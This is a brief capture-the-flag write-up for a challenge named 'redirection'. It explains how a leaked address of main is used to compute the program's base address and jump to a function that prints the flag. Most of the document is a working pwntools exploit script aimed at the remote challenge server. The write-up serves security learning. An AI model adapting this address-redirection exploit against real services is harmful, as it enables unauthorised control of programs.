Just normal address jumping, where the program will output `main` address and there a function to print the flag.

`main`: 0x11A9
`redirect_to_success`: 0x1262

To jump calculate with: `(base_address - 0x11A9) + 0x1262`

```py
from pwn import *

binary = './redirection'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
# r = process(binary)
r = remote('34.131.133.224', 12346)

r.recvuntil('Main function address: ')
main = r.recvline()

main = int(main, 16)
base_address = main - e.symbols['main']
print(f'base_address: {hex(base_address)}')
redirect_to_abyss = base_address + e.symbols['redirect_to_success']

print(f'redirect_to_abyss: {hex(redirect_to_abyss)}')
r.sendline(hex(redirect_to_abyss))
r.interactive()
```